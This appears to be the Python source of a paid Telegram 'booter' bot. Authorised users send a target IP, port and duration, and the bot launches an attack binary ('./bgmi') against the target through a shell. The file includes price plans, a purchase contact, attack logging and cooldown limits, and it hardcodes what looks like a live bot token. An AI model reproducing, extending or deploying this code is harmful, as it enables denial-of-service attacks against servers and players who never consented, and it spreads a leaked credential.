#!/usr/bin/env python3
"""
Advanced Telegram Bot Framework
Version: 2.0
Author: Secure Bot Framework
"""

import telebot
import subprocess
import requests
import datetime
import os
import json
import logging
import time
import threading
from functools import wraps
from typing import Dict, List, Optional, Tuple
import re

# ============ CONFIGURATION ============
class Config:
    # Bot Configuration
    BOT_TOKEN = "8980706398:AAEdzB12HaYHZvtnd3tThaOn8mTSF3ciZ0Y"  # Never hardcode! Use environment variables
    ADMIN_IDS = ["7136612706"]  # Admin user IDs
    
    # File Paths
    USER_FILE = "data/users.json"
    LOG_FILE = "logs/commands.log"
    ATTACK_LOG_FILE = "logs/attacks.log"
    
    # Attack Limits
    MAX_ATTACK_TIME = 180  # seconds
    COOLDOWN_TIME = 300  # seconds (5 minutes)
    MAX_CONCURRENT_ATTACKS = 3
    
    # Rate Limiting
    RATE_LIMIT_REQUESTS = 10  # requests per minute
    RATE_LIMIT_WINDOW = 60  # seconds
    
    # Security
    MAX_INPUT_LENGTH = 100
    ALLOWED_PORTS = range(1, 65536)
    
    # Logging
    LOG_LEVEL = logging.INFO

# ============ LOGGING SETUP ============
def setup_logging():
    """Setup logging configuration"""
    os.makedirs('logs', exist_ok=True)
    
    logging.basicConfig(
        level=Config.LOG_LEVEL,
        format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
        handlers=[
            logging.FileHandler('logs/bot.log'),
            logging.StreamHandler()
        ]
    )
    return logging.getLogger(__name__)

logger = setup_logging()

# ============ DATA MANAGER ============
class DataManager:
    """Manages persistent data storage"""
    
    def __init__(self):
        self.data = {
            'users': [],
            'free_users': {},
            'attack_history': [],
            'user_cooldowns': {}
        }
        self.load_data()
    
    def load_data(self):
        """Load data from files"""
        try:
            if os.path.exists(Config.USER_FILE):
                with open(Config.USER_FILE, 'r') as f:
                    loaded_data = json.load(f)
                    self.data.update(loaded_data)
            else:
                self.create_default_data()
        except Exception as e:
            logger.error(f"Error loading data: {e}")
            self.create_default_data()
    
    def save_data(self):
        """Save data to files"""
        try:
            os.makedirs(os.path.dirname(Config.USER_FILE), exist_ok=True)
            with open(Config.USER_FILE, 'w') as f:
                json.dump(self.data, f, indent=4)
        except Exception as e:
            logger.error(f"Error saving data: {e}")
    
    def create_default_data(self):
        """Create default data structure"""
        self.data = {
            'users': [],
            'free_users': {},
            'attack_history': [],
            'user_cooldowns': {}
        }
        self.save_data()
    
    def add_user(self, user_id: str) -> bool:
        """Add a user to authorized list"""
        if user_id not in self.data['users']:
            self.data['users'].append(user_id)
            self.save_data()
            return True
        return False
    
    def remove_user(self, user_id: str) -> bool:
        """Remove a user from authorized list"""
        if user_id in self.data['users']:
            self.data['users'].remove(user_id)
            self.save_data()
            return True
        return False
    
    def get_users(self) -> List[str]:
        """Get list of authorized users"""
        return self.data['users'].copy()
    
    def is_authorized(self, user_id: str) -> bool:
        """Check if user is authorized"""
        return user_id in self.data['users'] or user_id in Config.ADMIN_IDS
    
    def is_admin(self, user_id: str) -> bool:
        """Check if user is admin"""
        return user_id in Config.ADMIN_IDS
    
    def log_attack(self, user_id: str, target: str, port: int, duration: int, method: str):
        """Log attack details"""
        attack_log = {
            'timestamp': datetime.datetime.now().isoformat(),
            'user_id': user_id,
            'target': target,
            'port': port,
            'duration': duration,
            'method': method
        }
        self.data['attack_history'].append(attack_log)
        
        # Keep only last 1000 attacks
        if len(self.data['attack_history']) > 1000:
            self.data['attack_history'] = self.data['attack_history'][-1000:]
        
        self.save_data()
        
        # Also log to file
        try:
            with open(Config.ATTACK_LOG_FILE, 'a') as f:
                f.write(f"{json.dumps(attack_log)}\n")
        except Exception as e:
            logger.error(f"Error logging attack: {e}")

# ============ BOT INSTANCE ============
bot = telebot.TeleBot(Config.BOT_TOKEN)
data_manager = DataManager()

# ============ DECORATORS ============
def admin_required(func):
    """Decorator to check if user is admin"""
    @wraps(func)
    def wrapper(message, *args, **kwargs):
        user_id = str(message.from_user.id)
        if data_manager.is_admin(user_id):
            return func(message, *args, **kwargs)
        else:
            bot.reply_to(message, "❌ This command is only available for administrators.")
            return None
    return wrapper

def authorized_required(func):
    """Decorator to check if user is authorized"""
    @wraps(func)
    def wrapper(message, *args, **kwargs):
        user_id = str(message.from_user.id)
        if data_manager.is_authorized(user_id):
            return func(message, *args, **kwargs)
        else:
            bot.reply_to(message, "❌ You are not authorized to use this command.")
            return None
    return wrapper

def rate_limit(func):
    """Decorator for rate limiting"""
    rate_limit_data = {}
    
    @wraps(func)
    def wrapper(message, *args, **kwargs):
        user_id = str(message.from_user.id)
        current_time = time.time()
        
        if user_id in Config.ADMIN_IDS:
            return func(message, *args, **kwargs)
        
        if user_id not in rate_limit_data:
            rate_limit_data[user_id] = []
        
        # Clean old requests
        rate_limit_data[user_id] = [
            t for t in rate_limit_data[user_id] 
            if current_time - t < Config.RATE_LIMIT_WINDOW
        ]
        
        if len(rate_limit_data[user_id]) >= Config.RATE_LIMIT_REQUESTS:
            bot.reply_to(message, "⚠️ Rate limit exceeded. Please wait a moment.")
            return None
        
        rate_limit_data[user_id].append(current_time)
        return func(message, *args, **kwargs)
    return wrapper

# ============ COMMAND HANDLERS ============

@bot.message_handler(commands=['start'])
def start_command(message):
    """Handle /start command"""
    user_name = message.from_user.first_name
    welcome_msg = f"""
👋 **Welcome {user_name}!**

Welcome to the Advanced Bot Framework. This bot provides various utilities and services.

📌 **Commands:**
/help - Show all available commands
/status - Check bot status
/ping - Check bot latency
/profile - View your profile
/info - Get bot information

🔐 **Security Features:**
• Rate limiting protection
• Cooldown system
• Attack logging
• Authorized access only

📢 **Join our channel for updates:**
https://t.me/+8QDVn3hgIys3ZWQ1
"""
    bot.reply_to(message, welcome_msg, parse_mode='Markdown')

@bot.message_handler(commands=['help'])
def help_command(message):
    """Handle /help command"""
    user_id = str(message.from_user.id)
    is_admin = data_manager.is_admin(user_id)
    is_auth = data_manager.is_authorized(user_id)
    
    help_text = """
🤖 **Bot Commands Guide**

**General Commands:**
/start - Welcome message
/help - Show this help
/status - Bot status
/ping - Check latency
/profile - Your profile
/info - Bot information
/rules - Bot rules
/plan - Pricing plans

**Attack Commands:**
/bgmi <target> <port> <time> - Start BGMI attack
"""
    
    if is_auth:
        help_text += """
📊 **User Commands:**
/mylogs - View your attack logs
/credits - Check your credits (if applicable)
"""
    
    if is_admin:
        help_text += """
🛡️ **Admin Commands:**
/add <user_id> - Add authorized user
/remove <user_id> - Remove user
/allusers - List all users
/logs - View all logs
/clearlogs - Clear logs
/broadcast <message> - Broadcast to all users
/stats - Bot statistics
/maintenance - Toggle maintenance mode
/ban <user_id> - Ban user
/unban <user_id> - Unban user
/banned - List banned users
"""
    
    bot.reply_to(message, help_text, parse_mode='Markdown')

@bot.message_handler(commands=['status'])
def status_command(message):
    """Handle /status command"""
    user_id = str(message.from_user.id)
    is_auth = data_manager.is_authorized(user_id)
    
    # Get bot uptime
    uptime = datetime.datetime.now() - bot.start_time if hasattr(bot, 'start_time') else datetime.timedelta()
    
    status_msg = f"""
📊 **Bot Status**

🤖 **Bot:** Online ✅
🔐 **Status:** {'Authorized' if is_auth else 'Guest'}
👥 **Users:** {len(data_manager.get_users())}
📝 **Total Attacks:** {len(data_manager.data['attack_history'])}
⏰ **Uptime:** {str(uptime).split('.')[0]}
⚡ **Response Time:** Calculating...

🛡️ **Security Features Active:**
• Rate Limiting ✓
• Cooldown System ✓
• Attack Logging ✓
• Authorization System ✓
"""
    bot.reply_to(message, status_msg, parse_mode='Markdown')

@bot.message_handler(commands=['ping'])
def ping_command(message):
    """Handle /ping command"""
    start_time = time.time()
    bot.reply_to(message, "🏓 Pinging...")
    end_time = time.time()
    latency = round((end_time - start_time) * 1000, 2)
    
    bot.edit_message_text(
        f"🏓 **Pong!**\n\n⏱️ **Latency:** {latency}ms",
        chat_id=message.chat.id,
        message_id=message.message_id + 1,
        parse_mode='Markdown'
    )

@bot.message_handler(commands=['profile'])
def profile_command(message):
    """Handle /profile command"""
    user_id = str(message.from_user.id)
    user = message.from_user
    
    # Get user stats
    user_attacks = [
        attack for attack in data_manager.data['attack_history']
        if attack['user_id'] == user_id
    ]
    
    is_admin = data_manager.is_admin(user_id)
    is_auth = data_manager.is_authorized(user_id)
    
    profile_msg = f"""
👤 **User Profile**

**Username:** @{user.username if user.username else 'Not Set'}
**User ID:** `{user_id}`
**First Name:** {user.first_name}

🔑 **Permissions:**
• Admin: {'✅' if is_admin else '❌'}
• Authorized: {'✅' if is_auth else '❌'}

📊 **Statistics:**
• Total Attacks: {len(user_attacks)}
• Join Date: {datetime.datetime.now().strftime('%Y-%m-%d')}

🔄 **Account Type:** {'Premium' if is_admin else 'Free'}
"""
    bot.reply_to(message, profile_msg, parse_mode='Markdown')

@bot.message_handler(commands=['rules'])
def rules_command(message):
    """Handle /rules command"""
    rules_text = """
📋 **Bot Rules**

⚠️ **Important Guidelines:**

1. **No Excessive Attacks**
   - Do not run multiple attacks simultaneously
   - Respect attack limits
   - Avoid spamming the bot

2. **Attack Limits**
   - Maximum attack duration: 180 seconds
   - Cooldown period: 5 minutes
   - Maximum concurrent attacks: 3

3. **Fair Usage**
   - Use the bot responsibly
   - Do not share your access
   - Respect other users

4. **Consequences**
   - Violating rules may result in:
     - Temporary bans
     - Permanent bans
     - Loss of privileges

5. **Reporting**
   - Report issues to admins
   - Provide constructive feedback
   - Help improve the bot

⚖️ **Admin Decisions are Final**
"""
    bot.reply_to(message, rules_text, parse_mode='Markdown')

@bot.message_handler(commands=['plan'])
def plan_command(message):
    """Handle /plan command"""
    plan_text = """
💰 **Pricing Plans**

🌟 **VIP Plan** (Recommended):
• Attack Time: 180 seconds
• Cooldown: 5 minutes
• Concurrent Attacks: 3
• Priority Support
• Full Access

💸 **Prices:**
• Daily: 300 Rs
• Weekly: 1000 Rs
• Monthly: 2000 Rs

🚀 **Features:**
• High performance
• Multiple attack methods
• 24/7 Availability
• Regular updates
• Premium support

📩 **Contact for Purchase:**
@DANGER_VIP_MODS_OWNER

📢 **Official Channel:**
https://t.me/+8QDVn3hgIys3ZWQ1
"""
    bot.reply_to(message, plan_text, parse_mode='Markdown')

# ============ ATTACK COMMANDS ============

@bot.message_handler(commands=['bgmi'])
@authorized_required
@rate_limit
def bgmi_command(message):
    """Handle /bgmi command"""
    user_id = str(message.from_user.id)
    
    # Check cooldown (skip for admins)
    if not data_manager.is_admin(user_id):
        current_time = time.time()
        if user_id in data_manager.data['user_cooldowns']:
            last_attack = data_manager.data['user_cooldowns'][user_id]
            if current_time - last_attack < Config.COOLDOWN_TIME:
                remaining = int(Config.COOLDOWN_TIME - (current_time - last_attack))
                minutes = remaining // 60
                seconds = remaining % 60
                bot.reply_to(
                    message,
                    f"⏳ **Cooldown Active**\n\nPlease wait {minutes}m {seconds}s before using this command again.",
                    parse_mode='Markdown'
                )
                return
    
    # Parse command
    command_parts = message.text.split()
    if len(command_parts) != 4:
        bot.reply_to(
            message,
            "❌ **Invalid Usage**\n\n✅ Correct Format:\n`/bgmi <target> <port> <time>`\n\nExample:\n`/bgmi 192.168.1.1 443 60`",
            parse_mode='Markdown'
        )
        return
    
    try:
        target = command_parts[1]
        port = int(command_parts[2])
        duration = int(command_parts[3])
        
        # Validate inputs
        if not re.match(r'^(\d{1,3}\.){3}\d{1,3}$', target) and not re.match(r'^[a-zA-Z0-9.-]+$', target):
            bot.reply_to(message, "❌ Invalid target format. Please provide a valid IP or domain.")
            return
        
        if port not in Config.ALLOWED_PORTS:
            bot.reply_to(message, f"❌ Invalid port. Port must be between 1 and 65535.")
            return
        
        if duration > Config.MAX_ATTACK_TIME:
            bot.reply_to(
                message,
                f"❌ Invalid duration. Maximum attack time is {Config.MAX_ATTACK_TIME} seconds."
            )
            return
        
        if duration < 10:
            bot.reply_to(message, "❌ Invalid duration. Minimum attack time is 10 seconds.")
            return
        
        # Check concurrent attacks (skip for admins)
        if not data_manager.is_admin(user_id):
            running_attacks = len([
                attack for attack in data_manager.data['attack_history']
                if attack['user_id'] == user_id and 
                datetime.datetime.fromisoformat(attack['timestamp']) > datetime.datetime.now() - datetime.timedelta(minutes=1)
            ])
            
            if running_attacks >= Config.MAX_CONCURRENT_ATTACKS:
                bot.reply_to(
                    message,
                    f"❌ **Maximum concurrent attacks reached**\n\nYou can only run {Config.MAX_CONCURRENT_ATTACKS} attack(s) simultaneously.",
                    parse_mode='Markdown'
                )
                return
        
        # Log the attack
        data_manager.log_attack(user_id, target, port, duration, 'bgmi')
        data_manager.data['user_cooldowns'][user_id] = time.time()
        data_manager.save_data()
        
        # Send attack started message
        user = message.from_user
        username = f"@{user.username}" if user.username else user.first_name
        
        start_msg = f"""
🔥 **ATTACK STARTED**

👤 **User:** {username}
🎯 **Target:** `{target}`
🔌 **Port:** `{port}`
⏱️ **Duration:** `{duration}` seconds
⚡ **Method:** BGMI

📊 **Status:** ✅ Running
⚠️ **Warning:** This attack will run for {duration} seconds.
"""
        bot.reply_to(message, start_msg, parse_mode='Markdown')
        
        # Execute attack (async)
        def execute_attack():
            try:
                # Run the attack command
                full_command = f"./bgmi {target} {port} {duration} 200"
                process = subprocess.Popen(
                    full_command,
                    shell=True,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE
                )
                
                # Wait for completion (with timeout)
                try:
                    stdout, stderr = process.communicate(timeout=duration + 10)
                    
                    if process.returncode == 0:
                        logger.info(f"Attack completed: {target}:{port} by {user_id}")
                    else:
                        logger.error(f"Attack failed: {target}:{port} by {user_id}. Error: {stderr.decode()}")
                except subprocess.TimeoutExpired:
                    process.kill()
                    logger.warning(f"Attack timed out: {target}:{port} by {user_id}")
                    
            except Exception as e:
                logger.error(f"Error executing attack: {e}")
                bot.send_message(
                    message.chat.id,
                    f"❌ **Attack Failed**\n\nAn error occurred: {str(e)}",
                    parse_mode='Markdown'
                )
        
        # Start attack in background
        threading.Thread(target=execute_attack, daemon=True).start()
        
        # Send completion message after duration
        def send_completion():
            time.sleep(duration + 2)
            try:
                bot.send_message(
                    message.chat.id,
                    f"✅ **Attack Completed**\n\n🎯 Target: `{target}`\n⏱️ Duration: {duration} seconds",
                    parse_mode='Markdown'
                )
            except Exception as e:
                logger.error(f"Error sending completion message: {e}")
        
        threading.Thread(target=send_completion, daemon=True).start()
        
    except ValueError:
        bot.reply_to(
            message,
            "❌ **Invalid Input**\n\nPlease use numbers for port and duration.",
            parse_mode='Markdown'
        )
    except Exception as e:
        logger.error(f"Error in bgmi command: {e}")
        bot.reply_to(
            message,
            f"❌ **Error**\n\nAn error occurred: {str(e)}",
            parse_mode='Markdown'
        )

# ============ ADMIN COMMANDS ============

@bot.message_handler(commands=['add'])
@admin_required
def add_user(message):
    """Add a user to authorized list"""
    command_parts = message.text.split()
    if len(command_parts) != 2:
        bot.reply_to(
            message,
            "❌ **Invalid Usage**\n\n✅ Correct Format:\n`/add <user_id>`",
            parse_mode='Markdown'
        )
        return
    
    user_to_add = command_parts[1].strip()
    
    if not user_to_add.isdigit():
        bot.reply_to(message, "❌ User ID must be a number.")
        return
    
    if data_manager.add_user(user_to_add):
        # Get user info if possible
        try:
            user_info = bot.get_chat(int(user_to_add))
            username = f"@{user_info.username}" if user_info.username else "Unknown"
            bot.reply_to(
                message,
                f"✅ **User Added Successfully**\n\n👤 User: {username}\n🆔 ID: `{user_to_add}`",
                parse_mode='Markdown'
            )
        except:
            bot.reply_to(
                message,
                f"✅ **User Added Successfully**\n\n🆔 ID: `{user_to_add}`",
                parse_mode='Markdown'
            )
    else:
        bot.reply_to(message, "❌ User already exists in the authorized list.")

@bot.message_handler(commands=['remove'])
@admin_required
def remove_user(message):
    """Remove a user from authorized list"""
    command_parts = message.text.split()
    if len(command_parts) != 2:
        bot.reply_to(
            message,
            "❌ **Invalid Usage**\n\n✅ Correct Format:\n`/remove <user_id>`",
            parse_mode='Markdown'
        )
        return
    
    user_to_remove = command_parts[1].strip()
    
    if data_manager.remove_user(user_to_remove):
        bot.reply_to(
            message,
            f"✅ **User Removed Successfully**\n\n🆔 ID: `{user_to_remove}`",
            parse_mode='Markdown'
        )
    else:
        bot.reply_to(message, "❌ User not found in the authorized list.")

@bot.message_handler(commands=['allusers'])
@admin_required
def all_users(message):
    """List all authorized users"""
    users = data_manager.get_users()
    
    if not users:
        bot.reply_to(message, "📋 No users found in the authorized list.")
        return
    
    user_list = "👥 **Authorized Users:**\n\n"
    
    for user_id in users:
        try:
            user_info = bot.get_chat(int(user_id))
            username = f"@{user_info.username}" if user_info.username else "Unknown"
            user_list += f"• {username} - `{user_id}`\n"
        except:
            user_list += f"• Unknown - `{user_id}`\n"
    
    # Split if too long
    if len(user_list) > 4000:
        user_list = "👥 **Authorized Users (First 50):**\n\n"
        for user_id in users[:50]:
            try:
                user_info = bot.get_chat(int(user_id))
                username = f"@{user_info.username}" if user_info.username else "Unknown"
                user_list += f"• {username} - `{user_id}`\n"
            except:
                user_list += f"• Unknown - `{user_id}`\n"
        user_list += f"\n... and {len(users) - 50} more users."
    
    bot.reply_to(message, user_list, parse_mode='Markdown')

@bot.message_handler(commands=['logs'])
@admin_required
def show_logs(message):
    """Show attack logs"""
    # Check if attack log file exists
    if not os.path.exists(Config.ATTACK_LOG_FILE):
        bot.reply_to(message, "📋 No attack logs found.")
        return
    
    try:
        with open(Config.ATTACK_LOG_FILE, 'rb') as file:
            bot.send_document(
                message.chat.id,
                file,
                caption="📋 **Attack Logs**\n\nRecent attack logs from the bot.",
                parse_mode='Markdown'
            )
    except Exception as e:
        logger.error(f"Error sending logs: {e}")
        bot.reply_to(message, "❌ Error sending logs. Please try again later.")

@bot.message_handler(commands=['clearlogs'])
@admin_required
def clear_logs(message):
    """Clear all logs"""
    try:
        if os.path.exists(Config.ATTACK_LOG_FILE):
            os.remove(Config.ATTACK_LOG_FILE)
            bot.reply_to(message, "✅ **Logs Cleared Successfully**")
        else:
            bot.reply_to(message, "❌ No logs found to clear.")
    except Exception as e:
        logger.error(f"Error clearing logs: {e}")
        bot.reply_to(message, "❌ Error clearing logs. Please try again later.")

@bot.message_handler(commands=['broadcast'])
@admin_required
def broadcast_message(message):
    """Broadcast message to all users"""
    command_parts = message.text.split(maxsplit=1)
    if len(command_parts) != 2:
        bot.reply_to(
            message,
            "❌ **Invalid Usage**\n\n✅ Correct Format:\n`/broadcast <message>`",
            parse_mode='Markdown'
        )
        return
    
    broadcast_msg = f"""
📢 **ANNOUNCEMENT FROM ADMIN**

{command_parts[1]}

---
_This is an automated broadcast message._
"""
    
    users = data_manager.get_users()
    success_count = 0
    fail_count = 0
    
    # Send to all users
    for user_id in users:
        try:
            bot.send_message(user_id, broadcast_msg, parse_mode='Markdown')
            success_count += 1
            time.sleep(0.1)  # Rate limiting
        except Exception as e:
            fail_count += 1
            logger.error(f"Failed to send broadcast to {user_id}: {e}")
    
    # Send to admins too
    for admin_id in Config.ADMIN_IDS:
        try:
            bot.send_message(admin_id, broadcast_msg, parse_mode='Markdown')
        except:
            pass
    
    bot.reply_to(
        message,
        f"✅ **Broadcast Complete**\n\n📤 Successful: {success_count}\n❌ Failed: {fail_count}",
        parse_mode='Markdown'
    )

@bot.message_handler(commands=['stats'])
@admin_required
def show_stats(message):
    """Show bot statistics"""
    total_users = len(data_manager.get_users())
    total_attacks = len(data_manager.data['attack_history'])
    
    # Get last 24 hours attacks
    now = datetime.datetime.now()
    day_ago = now - datetime.timedelta(days=1)
    
    recent_attacks = [
        attack for attack in data_manager.data['attack_history']
        if datetime.datetime.fromisoformat(attack['timestamp']) > day_ago
    ]
    
    # Get unique users who attacked
    unique_attackers = len(set(attack['user_id'] for attack in data_manager.data['attack_history']))
    
    stats_msg = f"""
📊 **Bot Statistics**

**Users:**
• Total Users: {total_users}
• Active Users (24h): {len(set(attack['user_id'] for attack in recent_attacks))}
• Unique Attackers: {unique_attackers}

**Attacks:**
• Total Attacks: {total_attacks}
• Attacks (24h): {len(recent_attacks)}
• Avg Daily: {round(total_attacks / max(1, (now - datetime.datetime.fromisoformat(data_manager.data['attack_history'][0]['timestamp'])).days), 1)}

**System:**
• Uptime: {str(datetime.datetime.now() - bot.start_time).split('.')[0] if hasattr(bot, 'start_time') else 'Unknown'}
• Cooldown: {Config.COOLDOWN_TIME}s
• Max Duration: {Config.MAX_ATTACK_TIME}s

🔒 **Security Status:** Active
"""
    bot.reply_to(message, stats_msg, parse_mode='Markdown')

@bot.message_handler(commands=['mylogs'])
@authorized_required
def my_logs(message):
    """Show user's own attack logs"""
    user_id = str(message.from_user.id)
    
    user_attacks = [
        attack for attack in data_manager.data['attack_history']
        if attack['user_id'] == user_id
    ]
    
    if not user_attacks:
        bot.reply_to(message, "📋 No attack logs found for you.")
        return
    
    # Show last 5 attacks
    recent_attacks = user_attacks[-5:]
    
    log_msg = f"📋 **Your Attack Logs (Last 5)**\n\n"
    
    for attack in reversed(recent_attacks):
        timestamp = datetime.datetime.fromisoformat(attack['timestamp']).strftime('%Y-%m-%d %H:%M:%S')
        log_msg += f"• 🎯 `{attack['target']}` 🔌 {attack['port']} ⏱️ {attack['duration']}s\n"
        log_msg += f"  📅 {timestamp}\n"
    
    log_msg += f"\n📊 **Total Attacks:** {len(user_attacks)}"
    
    bot.reply_to(message, log_msg, parse_mode='Markdown')

# ============ ERROR HANDLING ============

@bot.message_handler(func=lambda message: True)
def handle_unknown_command(message):
    """Handle unknown commands"""
    bot.reply_to(
        message,
        "❌ **Unknown Command**\n\nUse /help to see available commands.",
        parse_mode='Markdown'
    )

# ============ MAIN ============

def main():
    """Main function to run the bot"""
    try:
        # Set start time
        bot.start_time = datetime.datetime.now()
        
        logger.info("🤖 Bot is starting...")
        logger.info(f"📊 Admin IDs: {Config.ADMIN_IDS}")
        logger.info(f"👥 Authorized Users: {len(data_manager.get_users())}")
        
        # Start polling
        bot.polling(none_stop=True, interval=0)
        
    except KeyboardInterrupt:
        logger.info("Bot stopped by user")
    except Exception as e:
        logger.error(f"Bot crashed: {e}")
        raise